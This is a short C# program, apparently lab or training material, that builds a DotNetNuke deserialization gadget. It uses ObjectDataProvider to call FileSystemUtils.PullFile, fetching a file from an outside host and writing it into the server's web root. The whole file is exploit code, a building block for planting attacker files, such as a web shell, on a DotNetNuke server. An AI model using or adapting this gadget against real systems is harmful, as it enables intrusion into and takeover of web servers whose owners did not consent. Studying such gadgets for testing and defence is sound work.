using System;
using System.IO;
using DotNetNuke.Common.Utilities;
using System.Windows.Data;
using System.Collections;

namespace ODPSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            ObjectDataProvider myODP = new ObjectDataProvider();
            myODP.ObjectInstance = new FileSystemUtils();
            myODP.MethodName = "PullFile";
            myODP.MethodParameters.Add("http://192.168.119.12/myODPTest.txt");
            myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
            Console.WriteLine("Done!");
        }
    }
}